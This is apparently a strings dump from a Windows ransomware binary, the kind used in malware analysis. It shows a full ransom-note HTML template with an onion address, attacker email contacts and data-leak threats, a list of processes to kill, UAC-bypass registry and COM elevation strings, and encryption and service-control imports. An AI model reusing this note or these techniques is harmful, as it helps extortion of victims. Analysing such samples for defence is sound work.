[Strings]
nth  paddr      vaddr      len  size section type    string
4548 0x00084714 0x01334714 6    14   .rdata  utf16le WINDIR
4549 0x00084724 0x01334724 11   24   .rdata  utf16le SYSTEMDRIVE
4550 0x0008473c 0x0133473c 17   36   .rdata  utf16le \Application Data
4551 0x00084760 0x01334760 380  381  .rdata  ascii   wxServer.exe,wxServerView,sqlservr.exe,sqlmangr.exe,RAgui.exe,supervise.exe,Culture.exe,RTVscan.exe,Defwatch.exe,sqlbrowser.exe,winword.exe,QBW32.exe,QBDBMgr.exe,qbupdate.exe,QBCFMonitorService.exe,axlbridge.exe,QBIDPService.exe,httpd.exe,fdlauncher.exe,MsDtSrvr.exe,tomcat6.exe,java.exe,360se.exe,360doctor.exe,wdswfsafe.exe,fdlauncher.exe,fdhost.exe,GDscan.exe,ZhuDongFangYu.exe
4552 0x00084f64 0x01334f64 14   30   .rdata  utf16le \Program Files
4553 0x00084f84 0x01334f84 11   24   .rdata  utf16le SYSTEMDRIVE
4554 0x00084f9c 0x01334f9c 16   34   .rdata  utf16le \Users\All Users
4555 0x00084fc0 0x01334fc0 24   25   .rdata  ascii   HOW_TO_RECOVER_DATA.html
4556 0x00085004 0x01335004 11   24   .rdata  utf16le SYSTEMDRIVE
4557 0x0008501c 0x0133501c 8    18   .rdata  utf16le \Windows
4558 0x00085030 0x01335030 1924 1925 .rdata  ascii   <html>\n    <style type="text/css">\n\n      body {\n      background-color: #f5f5f5;\n      }\n\nh1, h3{\n  text-align:  center;\n  text-transform: uppercase;\n  font-weight: normal;\n}\n\n\n/*---*/\n.tabs1{\n    display: block;\n    margin: auto;\n}\n.tabs1 .head{\n    text-align: center;\n    float: top;\n    padding: 0px;\n    text-transform: uppercase;\n    font-weight: normal;\n    display: block;\n    background: #81bef7;\n    color: #DF0101;\n    font-size: 30px;\n}\n\n.tabs1 .identi {\n    font-size: 10px;\n    text-align:  center;\n    float: top;\n    padding: 15px;\n    display: block;\n    background: #81bef7;\n    color: #DFDFDF;\n}\n\n\n.tabs .content {\n  background: #f5f5f5;\n  /*text-align: center;*/\n  color: #000000;\n  padding: 25px 15px;\n  font-size: 15px;\n  font-weight: 400;\n  line-height: 20px; }\n .tabs .content a {\n    color: #df0130;\n    font-size: 23px;\n    font-style: italic;\n    text-decoration: none;\n    line-height: 35px; }\n\n\n.tabs .content .text{\npadding: 25px;\nline-height: 1.2;\n}\n\n\n    </style>\n\n\n  <body>\n\n    <div class="tabs1">\n     <div class="head" ><b>Your personal ID:</b></div>\n      <div class="identi">\n      <span style="width:1000px; color: #ffffff; font-size: 10px;">{{IDENTIFIER}}</span> <br>\n<!-- !!! dont changing this !!! -->\n      </div>\n    </div>\n  <!-- -->\n    <div class="tabs">\n<!--tab-->  \n    <div class="tab">\n        <div id="tab-content1" class="content">\n         \n          <div class="text">\n          <!--text data -->\n\n          <b>/!\ YOUR COMPANY NETWORK HAS BEEN PENETRATED /!\</b><br>\n\n          <b>All your important files have been encrypted!</b><br><br>\n\t  <hr>\n             Your files are safe! Only modified. (RSA+AES)<br><br>\n\nANY ATTEMPT TO RESTORE YOUR FILES WITH THIRD-PARTY SOFTWARE<br>\nWILL PERMANENTLY CORRUPT IT.<br>\nDO NOT MODIFY ENCRYPTED FILES.<br>\nDO NOT RENAME ENCRYPTED FILES.<br><br>\n\nNo software available on internet can help you. We are the only ones able to<br>
4559 0x000857b5 0x013357b5 1979 1980 .rdata  ascii   solve your problem.<br><br>\n\nWe gathered highly confidential/personal data. These data are currently stored on<br>\na private server. This server will be immediately destroyed after your payment.<br>\nIf you decide to not pay, we will release your data to public or re-seller.<br>\nSo you can expect your data to be publicly available in the near future..<br><br>\n\n\nWe only seek money and our goal is not to damage your reputation or prevent<br>\nyour business from running.<br><br>\n\nYou will can send us 2-3 non-important files and we will decrypt it for free<br>\nto prove we are able to give your files back.<br><br>\n          <!--text data -->\n          <hr>\n          <b>Contact us for price and get decryption software.</b><br><br>\n<a>qd7pcafncosqfqu3ha6fcx4h6sr7tzwagzpcdcnytiw3b6varaeqv5yd.onion</a><br>\n* Note that this server is available via Tor browser only<br><br>\nFollow the instructions to open the link:<br>\n              1. Type the addres "https://www.torproject.org" in your Internet browser. It opens the Tor site.<br>\n              2. Press "Download Tor", then press "Download Tor Browser Bundle", install and run it.<br>\n              3. Now you have Tor browser. In the Tor Browser open <a>qd7pcafncosqfqu3ha6fcx4h6sr7tzwagzpcdcnytiw3b6varaeqv5yd.onion<br>\n          </a>\n                        4. Start a chat and follow the further instructions. <br>\n          <hr>\t\t\t\n          <b>If you can not use the above link, use the email:</b><br>\n          <a href="ithelp01@decorous.cyou  ">ithelp01@decorous.cyou   </a> <br>\n          <a href="ithelp01@wholeness.business ">ithelp01@wholeness.business   </a> <br>\n          \n          \n          <p>* To contact us, create a new free email account on the site:  <a href="https://protonmail.com">protonmail.com <br>\n\n<b>\nIF YOU DON'T CONTACT US WITHIN 72 HOURS, PRICE WILL BE HIGHER.</b><br>\n\n\n\n          </div>\n        </div>\n    </div>\n <!--tab-->    \n\n            \n          <!--text data -->\n          </div> 
4560 0x00085f71 0x01335f71 74   75   .rdata  ascii           </div>\n<!--tab--> \n    </div>\n    \n  </div>\n  \n  </body>\n</html>\n\n
4561 0x00088eb4 0x01338eb4 6    14   .rdata  utf16le \intel
4562 0x00088ec4 0x01338ec4 11   24   .rdata  utf16le SYSTEMDRIVE
4563 0x00088ee1 0x01338ee1 14   15   .rdata  ascii   IGN_NOTE_CODE2
4564 0x0008cd64 0x0133cd64 7    16   .rdata  utf16le \nvidia
4565 0x0008cd79 0x0133cd79 14   15   .rdata  ascii   IGN_NOTE_CODE3
4566 0x00090bfc 0x01340bfc 11   24   .rdata  utf16le SYSTEMDRIVE
4567 0x00090c19 0x01340c19 14   15   .rdata  ascii   IGN_NOTE_CODE4
4568 0x00094a9c 0x01344a9c 4    5    .rdata  ascii   <br>
4569 0x00094aa4 0x01344aa4 11   24   .rdata  utf16le SYSTEMDRIVE
4570 0x00094abc 0x01344abc 8    9    .rdata  ascii    letter 
4571 0x00094ac8 0x01344ac8 46   94   .rdata  utf16le Microsoft Enhanced Cryptographic Provider v1.0
4572 0x00094b28 0x01344b28 46   94   .rdata  utf16le Microsoft Enhanced Cryptographic Provider v1.0
4573 0x00094b88 0x01344b88 11   24   .rdata  utf16le SYSTEMDRIVE
4574 0x00094ba0 0x01344ba0 40   82   .rdata  utf16le \Program Files\Microsoft\Exchange Server
4575 0x00094bf4 0x01344bf4 11   24   .rdata  utf16le SYSTEMDRIVE
4576 0x00094c14 0x01344c14 44   90   .rdata  utf16le rogram Files (x86)\Microsoft\Exchange Server
4577 0x00094c70 0x01344c70 11   24   .rdata  utf16le SYSTEMDRIVE
4578 0x00094c88 0x01344c88 35   72   .rdata  utf16le \Program Files\Microsoft SQL Server
4579 0x00094cd0 0x01344cd0 11   24   .rdata  utf16le SYSTEMDRIVE
4580 0x00094ce8 0x01344ce8 41   84   .rdata  utf16le \Program Files (x86)\Microsoft SQL Server
4581 0x00094d3c 0x01344d3c 11   24   .rdata  utf16le SYSTEMDRIVE
4582 0x00094d54 0x01344d54 23   24   .rdata  ascii   [LOCKER] Assign device 
4583 0x00094d80 0x01344d80 4    20   .rdata  utf32le .$\\
4584 0x00094da0 0x01344da0 6    14   .rdata  utf16le igger1
4585 0x00094dc0 0x01344dc0 7    16   .rdata  utf16le AppData
4586 0x00094dd8 0x01344dd8 4    10   .rdata  utf16le host
4587 0x00094de4 0x01344de4 4    10   .rdata  utf16le .exe
4588 0x00094dfc 0x01344dfc 17   18   .rdata  ascii   %Y-%m-%dT%H:%M:%S
4589 0x00094e14 0x01344e14 9    20   .rdata  utf16le EnableLUA
4590 0x00094e28 0x01344e28 57   116  .rdata  utf16le SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
4591 0x00094e9c 0x01344e9c 28   58   .rdata  utf16le Elevation:Administrator!new:
4592 0x00094ed8 0x01344ed8 57   116  .rdata  utf16le SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
4593 0x00094f4c 0x01344f4c 26   54   .rdata  utf16le ConsentPromptBehaviorAdmin
4594 0x00094f88 0x01344f88 38   78   .rdata  utf16le {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
4595 0x00094fd8 0x01344fd8 38   78   .rdata  utf16le {6EDD6D74-C007-4E75-B76A-E5740995E24C}
4596 0x00095028 0x01345028 38   78   .rdata  utf16le {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
4597 0x00095078 0x01345078 23   24   .rdata  ascii   invalid string position
4598 0x00095090 0x01345090 18   19   .rdata  ascii   vector<T> too long
4599 0x000950a4 0x013450a4 15   16   .rdata  ascii   string too long
4600 0x00095284 0x01345284 16   17   .rdata  ascii   0123456789ABCDEF
4601 0x00095298 0x01345298 14   15   .rdata  ascii   bad conversion
4602 0x00095334 0x01345334 6    7    .rdata  ascii   system
4603 0x0009533c 0x0134533c 13   14   .rdata  ascii   unknown error
4604 0x0009534c 0x0134534c 16   17   .rdata  ascii   list<T> too long
4605 0x00098bb6 0x01348bb6 5    11   .rdata  utf16le \aO\ax\a
4606 0x0009903c 0x0134903c 4    5    .rdata  ascii   GCTL
4607 0x00099048 0x01349048 8    9    .rdata  ascii   .text$di
4608 0x0009905c 0x0134905c 8    9    .rdata  ascii   .text$mn
4609 0x00099070 0x01349070 7    8    .rdata  ascii   .text$x
4610 0x00099080 0x01349080 8    9    .rdata  ascii   .text$yd
4611 0x00099094 0x01349094 8    9    .rdata  ascii   .idata$5
4612 0x000990a8 0x013490a8 6    7    .rdata  ascii   .00cfg
4613 0x000990b8 0x013490b8 8    9    .rdata  ascii   .CRT$XCA
4614 0x000990cc 0x013490cc 9    10   .rdata  ascii   .CRT$XCAA
4615 0x000990e0 0x013490e0 8    9    .rdata  ascii   .CRT$XCC
4616 0x000990f4 0x013490f4 8    9    .rdata  ascii   .CRT$XCL
4617 0x00099108 0x01349108 8    9    .rdata  ascii   .CRT$XCU
4618 0x0009911c 0x0134911c 8    9    .rdata  ascii   .CRT$XCZ
4619 0x00099130 0x01349130 8    9    .rdata  ascii   .CRT$XIA
4620 0x00099144 0x01349144 9    10   .rdata  ascii   .CRT$XIAA
4621 0x00099158 0x01349158 9    10   .rdata  ascii   .CRT$XIAC
4622 0x0009916c 0x0134916c 8    9    .rdata  ascii   .CRT$XIC
4623 0x00099180 0x01349180 8    9    .rdata  ascii   .CRT$XIZ
4624 0x00099194 0x01349194 8    9    .rdata  ascii   .CRT$XLA
4625 0x000991a8 0x013491a8 8    9    .rdata  ascii   .CRT$XLZ
4626 0x000991bc 0x013491bc 8    9    .rdata  ascii   .CRT$XPA
4627 0x000991d0 0x013491d0 8    9    .rdata  ascii   .CRT$XPB
4628 0x000991e4 0x013491e4 8    9    .rdata  ascii   .CRT$XPX
4629 0x000991f8 0x013491f8 9    10   .rdata  ascii   .CRT$XPXA
4630 0x0009920c 0x0134920c 8    9    .rdata  ascii   .CRT$XPZ
4631 0x00099220 0x01349220 8    9    .rdata  ascii   .CRT$XTA
4632 0x00099234 0x01349234 8    9    .rdata  ascii   .CRT$XTZ
4633 0x00099248 0x01349248 6    7    .rdata  ascii   .rdata
4634 0x00099258 0x01349258 8    9    .rdata  ascii   .rdata$T
4635 0x0009926c 0x0134926c 8    9    .rdata  ascii   .rdata$r
4636 0x00099280 0x01349280 13   14   .rdata  ascii   .rdata$sxdata
4637 0x00099298 0x01349298 13   14   .rdata  ascii   .rdata$zzzdbg
4638 0x000992b0 0x013492b0 8    9    .rdata  ascii   .rtc$IAA
4639 0x000992c4 0x013492c4 8    9    .rdata  ascii   .rtc$IZZ
4640 0x000992d8 0x013492d8 8    9    .rdata  ascii   .rtc$TAA
4641 0x000992ec 0x013492ec 8    9    .rdata  ascii   .rtc$TZZ
4642 0x00099300 0x01349300 4    5    .rdata  ascii   .tls
4643 0x00099310 0x01349310 5    6    .rdata  ascii   .tls$
4644 0x00099320 0x01349320 8    9    .rdata  ascii   .tls$ZZZ
4645 0x00099334 0x01349334 8    9    .rdata  ascii   .xdata$x
4646 0x00099348 0x01349348 8    9    .rdata  ascii   .idata$2
4647 0x0009935c 0x0134935c 8    9    .rdata  ascii   .idata$3
4648 0x00099370 0x01349370 8    9    .rdata  ascii   .idata$4
4649 0x00099384 0x01349384 8    9    .rdata  ascii   .idata$6
4650 0x00099398 0x01349398 5    6    .rdata  ascii   .data
4651 0x000993a8 0x013493a8 7    8    .rdata  ascii   .data$r
4652 0x000993b8 0x013493b8 4    5    .rdata  ascii   .bss
4653 0x000993c8 0x013493c8 8    9    .rdata  ascii   .rsrc$01
4654 0x000993dc 0x013493dc 8    9    .rdata  ascii   .rsrc$02
4655 0x0009df8a 0x0134df8a 18   19   .rdata  ascii   GetModuleFileNameW
4656 0x0009dfa0 0x0134dfa0 12   13   .rdata  ascii   CreateMutexW
4657 0x0009dfb0 0x0134dfb0 5    6    .rdata  ascii   Sleep
4658 0x0009dfb8 0x0134dfb8 10   11   .rdata  ascii   OpenMutexW
4659 0x0009dfc6 0x0134dfc6 8    9    .rdata  ascii   ReadFile
4660 0x0009dfd2 0x0134dfd2 13   14   .rdata  ascii   GetFileSizeEx
4661 0x0009dfe2 0x0134dfe2 8    9    .rdata  ascii   HeapFree
4662 0x0009dfee 0x0134dfee 9    10   .rdata  ascii   WriteFile
4663 0x0009dffa 0x0134dffa 11   12   .rdata  ascii   CreateFileW
4664 0x0009e008 0x0134e008 18   19   .rdata  ascii   GetFileAttributesW
4665 0x0009e01e 0x0134e01e 18   19   .rdata  ascii   SetFileAttributesW
4666 0x0009e034 0x0134e034 12   13   .rdata  ascii   GetLastError
4667 0x0009e044 0x0134e044 11   12   .rdata  ascii   CloseHandle
4668 0x0009e052 0x0134e052 9    10   .rdata  ascii   HeapAlloc
4669 0x0009e05e 0x0134e05e 16   17   .rdata  ascii   SetFilePointerEx
4670 0x0009e072 0x0134e072 11   12   .rdata  ascii   MoveFileExW
4671 0x0009e080 0x0134e080 14   15   .rdata  ascii   GetProcessHeap
4672 0x0009e092 0x0134e092 16   17   .rdata  ascii   GetLogicalDrives
4673 0x0009e0a6 0x0134e0a6 23   24   .rdata  ascii   GetEnvironmentVariableW
4674 0x0009e0c0 0x0134e0c0 15   16   .rdata  ascii   QueryDosDeviceW
4675 0x0009e0d2 0x0134e0d2 16   17   .rdata  ascii   FindFirstVolumeW
4676 0x0009e0e6 0x0134e0e6 20   21   .rdata  ascii   SetVolumeMountPointW
4677 0x0009e0fe 0x0134e0fe 15   16   .rdata  ascii   FindVolumeClose
4678 0x0009e110 0x0134e110 32   33   .rdata  ascii   GetVolumePathNamesForVolumeNameW
4679 0x0009e134 0x0134e134 15   16   .rdata  ascii   FindNextVolumeW
4680 0x0009e146 0x0134e146 9    10   .rdata  ascii   FindClose
4681 0x0009e152 0x0134e152 16   17   .rdata  ascii   TerminateProcess
4682 0x0009e166 0x0134e166 19   20   .rdata  ascii   WaitForSingleObject
4683 0x0009e17c 0x0134e17c 11   12   .rdata  ascii   OpenProcess
4684 0x0009e18a 0x0134e18a 24   25   .rdata  ascii   CreateToolhelp32Snapshot
4685 0x0009e1a6 0x0134e1a6 14   15   .rdata  ascii   Process32NextW
4686 0x0009e1b8 0x0134e1b8 15   16   .rdata  ascii   Process32FirstW
4687 0x0009e1ca 0x0134e1ca 14   15   .rdata  ascii   CreateProcessW
4688 0x0009e1dc 0x0134e1dc 12   13   .rdata  ascii   GetTickCount
4689 0x0009e1ec 0x0134e1ec 9    10   .rdata  ascii   CopyFileW
4690 0x0009e1f8 0x0134e1f8 17   18   .rdata  ascii   GetCurrentProcess
4691 0x0009e20a 0x0134e20a 12   13   .rdata  ascii   KERNEL32.dll
4692 0x0009e21a 0x0134e21a 15   16   .rdata  ascii   RegDeleteValueW
4693 0x0009e22c 0x0134e22c 13   14   .rdata  ascii   RegCreateKeyW
4694 0x0009e23c 0x0134e23c 13   14   .rdata  ascii   RegOpenKeyExW
4695 0x0009e24c 0x0134e24c 14   15   .rdata  ascii   RegSetValueExW
4696 0x0009e25e 0x0134e25e 11   12   .rdata  ascii   RegCloseKey
4697 0x0009e26c 0x0134e26c 19   20   .rdata  ascii   CryptReleaseContext
4698 0x0009e282 0x0134e282 11   12   .rdata  ascii   CryptGenKey
4699 0x0009e290 0x0134e290 14   15   .rdata  ascii   CryptImportKey
4700 0x0009e2a2 0x0134e2a2 14   15   .rdata  ascii   CryptExportKey
4701 0x0009e2b4 0x0134e2b4 17   18   .rdata  ascii   CryptDuplicateKey
4702 0x0009e2c8 0x0134e2c8 12   13   .rdata  ascii   CryptEncrypt
4703 0x0009e2d8 0x0134e2d8 20   21   .rdata  ascii   CryptAcquireContextW
4704 0x0009e2f0 0x0134e2f0 15   16   .rdata  ascii   CryptDestroyKey
4705 0x0009e302 0x0134e302 20   21   .rdata  ascii   QueryServiceStatusEx
4706 0x0009e31a 0x0134e31a 12   13   .rdata  ascii   OpenServiceW
4707 0x0009e32a 0x0134e32a 22   23   .rdata  ascii   EnumDependentServicesW
4708 0x0009e344 0x0134e344 14   15   .rdata  ascii   ControlService
4709 0x0009e356 0x0134e356 13   14   .rdata  ascii   DeleteService
4710 0x0009e366 0x0134e366 14   15   .rdata  ascii   OpenSCManagerW
4711 0x0009e378 0x0134e378 18   19   .rdata  ascii   CloseServiceHandle
4712 0x0009e38e 0x0134e38e 19   20   .rdata  ascii   GetTokenInformation
4713 0x0009e3a4 0x0134e3a4 16   17   .rdata  ascii   OpenProcessToken
4714 0x0009e3b6 0x0134e3b6 12   13   .rdata  ascii   ADVAPI32.dll
4715 0x0009e3c6 0x0134e3c6 18   19   .rdata  ascii   SHEmptyRecycleBinW
4716 0x0009e3da 0x0134e3da 11   12   .rdata  ascii   SHELL32.dll
4717 0x0009e3e8 0x0134e3e8 14   15   .rdata  ascii   CoUninitialize
4718 0x0009e3fa 0x0134e3fa 16   17   .rdata  ascii   CoCreateInstance
4719 0x0009e40e 0x0134e40e 20   21   .rdata  ascii   CoInitializeSecurity
4720 0x0009e426 0x0134e426 14   15   .rdata  ascii   CoInitializeEx
4721 0x0009e438 0x0134e438 12   13   .rdata  ascii   CoInitialize
4722 0x0009e448 0x0134e448 13   14   .rdata  ascii   IIDFromString
4723 0x0009e458 0x0134e458 15   16   .rdata  ascii   CLSIDFromString
4724 0x0009e46a 0x0134e46a 11   12   .rdata  ascii   CoGetObject
4725 0x0009e476 0x0134e476 9    10   .rdata  ascii   ole32.dll
4726 0x0009e480 0x0134e480 12   13   .rdata  ascii   OLEAUT32.dll
4727 0x0009e490 0x0134e490 20   21   .rdata  ascii   CryptStringToBinaryA
4728 0x0009e4a6 0x0134e4a6 11   12   .rdata  ascii   CRYPT32.dll
4729 0x0009e4b4 0x0134e4b4 18   19   .rdata  ascii   WNetGetConnectionW
4730 0x0009e4c8 0x0134e4c8 7    8    .rdata  ascii   MPR.dll
4731 0x0009e4d2 0x0134e4d2 12   13   .rdata  ascii   NetShareEnum
4732 0x0009e4e2 0x0134e4e2 16   17   .rdata  ascii   NetApiBufferFree
4733 0x0009e4f4 0x0134e4f4 12   13   .rdata  ascii   NETAPI32.dll
4734 0x0009e504 0x0134e504 12   13   .rdata  ascii   IcmpSendEcho
4735 0x0009e514 0x0134e514 15   16   .rdata  ascii   IcmpCloseHandle
4736 0x0009e526 0x0134e526 15   16   .rdata  ascii   GetAdaptersInfo
4737 0x0009e538 0x0134e538 14   15   .rdata  ascii   IcmpCreateFile
4738 0x0009e548 0x0134e548 12   13   .rdata  ascii   IPHLPAPI.DLL
4739 0x0009e556 0x0134e556 10   11   .rdata  ascii   WS2_32.dll
4740 0x0009e564 0x0134e564 19   20   .rdata  ascii   RmRegisterResources
4741 0x0009e57a 0x0134e57a 9    10   .rdata  ascii   RmGetList
4742 0x0009e586 0x0134e586 14   15   .rdata  ascii   RmStartSession
4743 0x0009e598 0x0134e598 10   11   .rdata  ascii   RmShutdown
4744 0x0009e5a6 0x0134e5a6 12   13   .rdata  ascii   RmEndSession
4745 0x0009e5b4 0x0134e5b4 12   13   .rdata  ascii   RstrtMgr.DLL
4746 0x0009e5c4 0x0134e5c4 13   14   .rdata  ascii   EncodePointer
4747 0x0009e5d4 0x0134e5d4 13   14   .rdata  ascii   DecodePointer
4748 0x0009e5e4 0x0134e5e4 14   15   .rdata  ascii   RaiseException
4749 0x0009e5f6 0x0134e5f6 18   19   .rdata  ascii   GetCurrentThreadId
4750 0x0009e60c 0x0134e60c 25   26   .rdata  ascii   IsProcessorFeaturePresent
4751 0x0009e628 0x0134e628 17   18   .rdata  ascii   QueueUserWorkItem
4752 0x0009e63c 0x0134e63c 18   19   .rdata  ascii   GetModuleHandleExW
4753 0x0009e652 0x0134e652 20   21   .rdata  ascii   EnterCriticalSection
4754 0x0009e66a 0x0134e66a 20   21   .rdata  ascii   LeaveCriticalSection
4755 0x0009e682 0x0134e682 23   24   .rdata  ascii   TryEnterCriticalSection
4756 0x0009e69c 0x0134e69c 21   22   .rdata  ascii   DeleteCriticalSection
4757 0x0009e6b4 0x0134e6b4 23   24   .rdata  ascii   QueryPerformanceCounter
4758 0x0009e6ce 0x0134e6ce 25   26   .rdata  ascii   QueryPerformanceFrequency
4759 0x0009e6ea 0x0134e6ea 14   15   .rdata  ascii   FormatMessageW
4760 0x0009e6fc 0x0134e6fc 19   20   .rdata  ascii   WideCharToMultiByte
4761 0x0009e712 0x0134e712 19   20   .rdata  ascii   MultiByteToWideChar
4762 0x0009e728 0x0134e728 16   17   .rdata  ascii   FindFirstFileExW
4763 0x0009e73c 0x0134e73c 13   14   .rdata  ascii   FindNextFileW
4764 0x0009e74c 0x0134e74c 20   21   .rdata  ascii   GetFileAttributesExW
4765 0x0009e764 0x0134e764 12   13   .rdata  ascii   SetLastError
4766 0x0009e774 0x0134e774 37   38   .rdata  ascii   InitializeCriticalSectionAndSpinCount
4767 0x0009e79c 0x0134e79c 12   13   .rdata  ascii   CreateEventW
4768 0x0009e7ac 0x0134e7ac 14   15   .rdata  ascii   SwitchToThread
4769 0x0009e7be 0x0134e7be 8    9    .rdata  ascii   TlsAlloc
4770 0x0009e7ca 0x0134e7ca 11   12   .rdata  ascii   TlsGetValue
4771 0x0009e7d8 0x0134e7d8 11   12   .rdata  ascii   TlsSetValue
4772 0x0009e7e6 0x0134e7e6 7    8    .rdata  ascii   TlsFree
4773 0x0009e7f0 0x0134e7f0 23   24   .rdata  ascii   GetSystemTimeAsFileTime
4774 0x0009e80a 0x0134e80a 16   17   .rdata  ascii   GetModuleHandleW
4775 0x0009e81e 0x0134e81e 14   15   .rdata  ascii   GetProcAddress
4776 0x0009e830 0x0134e830 21   22   .rdata  ascii   WaitForSingleObjectEx
4777 0x0009e848 0x0134e848 14   15   .rdata  ascii   GetStringTypeW
4778 0x0009e85a 0x0134e85a 14   15   .rdata  ascii   CompareStringW
4779 0x0009e86c 0x0134e86c 12   13   .rdata  ascii   LCMapStringW
4780 0x0009e87c 0x0134e87c 14   15   .rdata  ascii   GetLocaleInfoW
4781 0x0009e88e 0x0134e88e 9    10   .rdata  ascii   GetCPInfo
4782 0x0009e89a 0x0134e89a 8    9    .rdata  ascii   SetEvent
4783 0x0009e8a6 0x0134e8a6 10   11   .rdata  ascii   ResetEvent
4784 0x0009e8b4 0x0134e8b4 24   25   .rdata  ascii   UnhandledExceptionFilter
4785 0x0009e8d0 0x0134e8d0 27   28   .rdata  ascii   SetUnhandledExceptionFilter
4786 0x0009e8ee 0x0134e8ee 17   18   .rdata  ascii   IsDebuggerPresent
4787 0x0009e902 0x0134e902 15   16   .rdata  ascii   GetStartupInfoW
4788 0x0009e914 0x0134e914 19   20   .rdata  ascii   GetCurrentProcessId
4789 0x0009e92a 0x0134e92a 19   20   .rdata  ascii   InitializeSListHead
4790 0x0009e940 0x0134e940 9    10   .rdata  ascii   LocalFree
4791 0x0009e94c 0x0134e94c 16   17   .rdata  ascii   CreateTimerQueue
4792 0x0009e960 0x0134e960 19   20   .rdata  ascii   SignalObjectAndWait
4793 0x0009e976 0x0134e976 12   13   .rdata  ascii   CreateThread
4794 0x0009e986 0x0134e986 17   18   .rdata  ascii   SetThreadPriority
4795 0x0009e99a 0x0134e99a 17   18   .rdata  ascii   GetThreadPriority
4796 0x0009e9ae 0x0134e9ae 30   31   .rdata  ascii   GetLogicalProcessorInformation
4797 0x0009e9d0 0x0134e9d0 21   22   .rdata  ascii   CreateTimerQueueTimer
4798 0x0009e9e8 0x0134e9e8 21   22   .rdata  ascii   ChangeTimerQueueTimer
4799 0x0009ea00 0x0134ea00 21   22   .rdata  ascii   DeleteTimerQueueTimer
4800 0x0009ea18 0x0134ea18 24   25   .rdata  ascii   GetNumaHighestNodeNumber
4801 0x0009ea34 0x0134ea34 22   23   .rdata  ascii   GetProcessAffinityMask
4802 0x0009ea4e 0x0134ea4e 21   22   .rdata  ascii   SetThreadAffinityMask
4803 0x0009ea66 0x0134ea66 27   28   .rdata  ascii   RegisterWaitForSingleObject
4804 0x0009ea84 0x0134ea84 14   15   .rdata  ascii   UnregisterWait
4805 0x0009ea96 0x0134ea96 16   17   .rdata  ascii   GetCurrentThread
4806 0x0009eaaa 0x0134eaaa 14   15   .rdata  ascii   GetThreadTimes
4807 0x0009eabc 0x0134eabc 11   12   .rdata  ascii   FreeLibrary
4808 0x0009eaca 0x0134eaca 24   25   .rdata  ascii   FreeLibraryAndExitThread
4809 0x0009eae6 0x0134eae6 16   17   .rdata  ascii   GetModuleHandleA
4810 0x0009eafa 0x0134eafa 14   15   .rdata  ascii   LoadLibraryExW
4811 0x0009eb0c 0x0134eb0c 13   14   .rdata  ascii   GetVersionExW
4812 0x0009eb1c 0x0134eb1c 12   13   .rdata  ascii   VirtualAlloc
4813 0x0009eb2c 0x0134eb2c 14   15   .rdata  ascii   VirtualProtect
4814 0x0009eb3e 0x0134eb3e 11   12   .rdata  ascii   VirtualFree
4815 0x0009eb4c 0x0134eb4c 15   16   .rdata  ascii   DuplicateHandle
4816 0x0009eb5e 0x0134eb5e 16   17   .rdata  ascii   ReleaseSemaphore
4817 0x0009eb72 0x0134eb72 24   25   .rdata  ascii   InterlockedPopEntrySList
4818 0x0009eb8e 0x0134eb8e 25   26   .rdata  ascii   InterlockedPushEntrySList
4819 0x0009ebaa 0x0134ebaa 21   22   .rdata  ascii   InterlockedFlushSList
4820 0x0009ebc2 0x0134ebc2 15   16   .rdata  ascii   QueryDepthSList
4821 0x0009ebd4 0x0134ebd4 16   17   .rdata  ascii   UnregisterWaitEx
4822 0x0009ebe8 0x0134ebe8 12   13   .rdata  ascii   LoadLibraryW
4823 0x0009ebf8 0x0134ebf8 9    10   .rdata  ascii   RtlUnwind
4824 0x0009ec04 0x0134ec04 11   12   .rdata  ascii   ExitProcess
4825 0x0009ec12 0x0134ec12 23   24   .rdata  ascii   SetEnvironmentVariableW
4826 0x0009ec2c 0x0134ec2c 12   13   .rdata  ascii   GetStdHandle
4827 0x0009ec3c 0x0134ec3c 14   15   .rdata  ascii   GetDateFormatW
4828 0x0009ec4e 0x0134ec4e 14   15   .rdata  ascii   GetTimeFormatW
4829 0x0009ec60 0x0134ec60 13   14   .rdata  ascii   IsValidLocale
4830 0x0009ec70 0x0134ec70 18   19   .rdata  ascii   GetUserDefaultLCID
4831 0x0009ec86 0x0134ec86 18   19   .rdata  ascii   EnumSystemLocalesW
4832 0x0009ec9c 0x0134ec9c 22   23   .rdata  ascii   GetTimeZoneInformation
4833 0x0009ecb6 0x0134ecb6 11   12   .rdata  ascii   GetFileType
4834 0x0009ecc4 0x0134ecc4 11   12   .rdata  ascii   HeapReAlloc
4835 0x0009ecd2 0x0134ecd2 15   16   .rdata  ascii   IsValidCodePage
